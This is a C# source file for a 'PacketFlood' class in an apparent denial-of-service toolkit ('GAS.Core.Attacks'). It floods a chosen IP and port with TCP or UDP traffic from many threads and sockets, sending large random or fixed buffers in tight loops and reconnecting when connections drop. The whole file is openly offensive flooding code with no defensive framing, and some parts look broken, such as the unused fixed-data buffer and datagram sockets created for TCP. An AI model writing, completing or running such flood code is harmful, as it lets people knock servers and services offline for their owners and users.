using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace GAS.Core.Attacks {
    public class PacketFlood : IAttacker {
        #region vars
        readonly int _spt;
        private bool _resp;
        private readonly bool _allowRandom;
        private bool _init;
        private readonly string _data;
        private readonly int _protocol;
        private readonly Thread[] _workingThreads;
        private const int BUFFER_SIZE = 50000;
        readonly FastRandom.FastRandom _rng = new FastRandom.FastRandom();
        DataS[] _floodInfo;
        #endregion
        #region attack methods
        private void TCPAttack( IPEndPoint trg, DataS data ) {
            #region Connect handler
            data.Conn = new SocketAsyncEventArgs {
                DisconnectReuseSocket = true,
                RemoteEndPoint = trg,
                SocketFlags = SocketFlags.None,
                UserToken = data
            };
            #endregion
            #region Sent handler
            data.Snd = new SocketAsyncEventArgs {
                DisconnectReuseSocket = true,
                SocketFlags = SocketFlags.None,
                UserToken = data
            };
            #endregion
            #region attach handlers
            data.Snd.Completed += this.SND;
            data.Conn.Completed += this.OnConnected;
            #endregion
            #region if random generate shit else use data field
            data.Bytes = new byte[ BUFFER_SIZE ];
            if ( this._allowRandom )
                this.RefreshBuffer( data );
            else {
                var buf = System.Text.Encoding.ASCII.GetBytes( this._data );
            }
            #endregion
            //connect
            if ( !data.S.ConnectAsync( data.Conn ) )
                this.SND( data.S, data.Snd );
        }
        private void UDPAttack( IPEndPoint trg, DataS data ) {
            #region send handler data
            data.Snd = new SocketAsyncEventArgs {
                DisconnectReuseSocket = true,
                SocketFlags = SocketFlags.None,
                UserToken = data,
                RemoteEndPoint = trg
            };
            #endregion
            #region attach handlers
            data.Snd.Completed += this._SND;
            #endregion
            #region if random generate shit else use data field
            data.Bytes = new byte[ BUFFER_SIZE ];
            if ( this._allowRandom )
                this.RefreshBuffer( data );
            else {
                var buf = System.Text.Encoding.ASCII.GetBytes( this._data );
            }
            #endregion
            if ( !data.S.SendToAsync( data.Snd ) )
                this._SND( data, data.Snd );
        }
        #endregion
        void _SND( object a, SocketAsyncEventArgs b ) {
            try {
                var data = (DataS) a;
                //while attacking
                while ( this.IsFlooding ) {
                    this.Requested++;
                    //generate data if needed
                    if ( this._allowRandom )
                        this.RefreshBuffer( data );
                    if ( data.S.SendToAsync( data.Snd ) )
                        return;
                }
            }
            catch ( Exception ) { }
        }
        #region Constructor
        public PacketFlood( string ip, int port, int proto, int delay, bool resp, string data, bool random, int threadcount, int socketsPerThread ) {
            this.ThreadCount = threadcount;
            this._workingThreads = new Thread[ this.ThreadCount ];
            this.Target = Dns.GetHostAddresses( ip )[ 0 ].ToString();
            this.Port = port;
            this._protocol = proto;
            this.Delay = delay;
            this._resp = resp;
            this._data = data;
            this._allowRandom = random;
            this._spt = socketsPerThread;

        }
        #endregion
        #region control
        public override void Start() {
            if ( this.IsFlooding )
                throw new InvalidOperationException( "Attack already running" );
            this.IsFlooding = true;
            this._floodInfo = new DataS[ this._spt * this.ThreadCount ];
            //create attack storage array
            for ( var i = 0; i < this._floodInfo.Length; this._floodInfo[ i++ ] = new DataS() ) { }
            //start threads
            for ( var i = 0; i < this.ThreadCount; ( this._workingThreads[ i ] = new Thread( this.bw_DoWork ) ).Start( i++ ) ) { }
            this._init = true;
        }
        public override void Stop() {
            //stop flooding
            this.IsFlooding = false;
            if ( this._floodInfo != null ) {
                foreach ( var flood in this._floodInfo ) {
                    if ( flood.S != null ) {
                        flood.S.Close();
                        //remove links to parent to prevent memleaks
                        if ( flood.Snd != null ) {
                            flood.Snd.UserToken = null;
                            if ( flood.Conn != null ) {
                                flood.Conn.UserToken = null;
                                //dispose sockets
                                flood.Conn.Dispose();
                            }
                            flood.Snd.Dispose();
                        }
                        flood.S.Dispose();
                        //feed gc
                        flood.Bytes = null;
                        flood.Conn = null;
                    }
                    flood.S = null;
                    flood.Snd = null;
                }
            }
            this._floodInfo = null;
        }
        #endregion
        #region helper data
        //attack data storage
        class DataS {
            public Socket S;
            public byte[] Bytes;
            public SocketAsyncEventArgs Conn, Snd;
        }
        //thread wrapper
        private void bw_DoWork( object sender ) {
            while ( !this._init ) Thread.Sleep( 100 );
            try {
                var rHost = new IPEndPoint( IPAddress.Parse( this.Target ), this.Port );
                for ( var i = 0; i < this._spt; i++ ) {
                    switch ( this._protocol ) {
                        case 1:
                            this.TCPAttack( rHost, this._floodInfo[ (int) sender * this._spt + i ] );
                            break;
                        case 2:
                            this.UDPAttack( rHost, this._floodInfo[ (int) sender * this._spt + i ] );
                            break;
                    }
                }
            }
            catch ( Exception ) { }
        }
        #endregion
        #region Async code
        /// <summary>
        /// Sent handler for tcpattack
        /// </summary>
        /// <param name="a">Data with data</param>
        /// <param name="b">SocketAsyncEventArgs</param>
        void SND( object a, SocketAsyncEventArgs b ) {
            var data = (DataS) a;
            try {
                //while attacking
                while ( this.IsFlooding ) {
                    this.Requested++;
                    //while connected send data
                    while ( this.IsFlooding && b.SocketError == SocketError.Success && ( data.S ).Connected ) {
                        //generate data if needed
                        if ( this._allowRandom )
                            this.RefreshBuffer( data );
                        if ( data.S.SendAsync( data.Snd ) )
                            return;
                    }
                    //if disconnected && attacking => create new socket
                    if ( !this.IsFlooding || data.S.Connected ) continue;
                    data.S = CreateSocket( data.S.ProtocolType );
                    ////data.Conn.UserToken = data;
                    ////data.Snd.UserToken = data;

                    //try connect async
                    //if async => exit function, OnConnected will be invoked by event
                    //else continue looping
                    if ( data.S.ConnectAsync( data.Conn ) )
                        return;
                }
            }
            catch { }
        }
        /// <summary>
        /// Socket.Connected handler
        /// </summary>
        /// <param name="a">DataS with data</param>
        /// <param name="b">SocketAsyncEventArgs</param>
        void OnConnected( object a, SocketAsyncEventArgs b ) {
            var data = (DataS) a;
            try {
                //main attack event loop
                if ( !this.IsFlooding ) return;
                //while not connected
                while ( b.SocketError != SocketError.Success || !data.S.Connected )
                    //if async => exit function, SND will be invoked by event
                    //else try to send data
                    if ( this.IsFlooding )
                        if ( ( data.S ).ConnectAsync( data.Conn ) )
                            return;
                //try to send data async. 
                //if async => exit function, SND will be invoked by event
                //else invoke SND
                if ( !this.IsFlooding ) return;
                if ( !data.S.SendAsync( data.Snd ) )
                    this.SND( a, data.Snd );
            }
            catch { }
        }
        /// <summary>
        /// recreate socket
        /// </summary>
        /// <param name="type"></param>
        /// <returns></returns>
        static Socket CreateSocket( ProtocolType type ) {
            return new Socket( AddressFamily.InterNetwork, SocketType.Dgram, type ) {
                Blocking = false
            };
        }
        /// <summary>
        /// Fill buffer with random bytes
        /// </summary>
        /// <param name="data"></param>
        void RefreshBuffer( DataS data ) {
            //fill buffer with random
            this._rng.NextBytes( data.Bytes );
            //set buffer as default send data
            data.Snd.SetBuffer( data.Bytes, 0, data.Bytes.Length );
        }
        #endregion
    }
}